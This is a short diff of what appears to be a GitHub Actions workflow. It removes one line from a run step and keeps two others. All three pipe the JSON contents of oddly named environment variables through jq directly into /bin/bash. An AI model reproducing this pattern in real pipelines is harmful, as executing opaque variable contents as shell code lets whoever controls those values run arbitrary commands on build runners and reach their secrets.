@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$lktn4" | jq -r .xq7999 | /bin/bash
           printf '%s' "$q64" | jq -r .tk6 | /bin/bash
-          echo $uzpow0485 | jq -r .dtv059 | /bin/bash
 
       - name: Save output
         if: always()
